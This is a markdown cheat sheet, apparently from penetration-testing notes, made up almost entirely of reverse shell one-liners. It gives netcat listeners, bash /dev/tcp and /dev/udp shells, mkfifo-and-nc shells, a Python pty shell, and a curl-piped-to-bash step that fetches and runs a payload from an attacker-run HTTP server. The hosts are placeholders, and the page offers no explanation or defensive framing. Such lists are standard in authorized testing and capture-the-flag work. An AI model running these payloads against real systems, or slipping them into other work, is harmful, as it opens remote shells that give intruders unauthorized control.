# Shell

- [Shell](#shell)
  - [Listener](#listener)
    - [Default](#default)
    - [Interactive with rlwrap](#interactive-with-rlwrap)
  - [Reverse Shell - BASH](#reverse-shell---bash)
    - [TCP](#tcp)
    - [UDP](#udp)
  - [SH + Default NC](#sh--default-nc)
    - [TCP](#tcp-1)
    - [UDP](#udp-1)
  - [cURL](#curl)
  - [Python](#python)

## Listener

### Default

```bash
nc -lvp 1337
```

### Interactive with rlwrap

```bash
rlwrap -r -f . nc -lvp 1337
```

## Reverse Shell - BASH

### TCP

```bash
/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1
```

> OR

```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1" &
```

### UDP

```bash
/bin/bash -i >& /dev/udp/IP_ADDRESS/PORT 0>&1
```

> OR

```bash
/bin/bash -c "/bin/bash -i >& /dev/udp/IP_ADDRESS/PORT 0>&1" &
```

## SH + Default NC

### TCP

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LIP_ADDRESS PORT >/tmp/f
```

### UDP

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LIP_ADDRESS PORT -u >/tmp/f
```

## cURL

> Server (Attacker)

```bash
mkdir -m 700 /tmp/serverHTTP
cd /tmp/serverHTTP
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1" &' > index.html
python -m http.server PORT
```

> Client

```bash
curl${IFS}LIP_ADDRESS:PORT/index.html|bash
```

## Python

```python
export RHOST="LIP_ADDRESS";export RPORT=PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
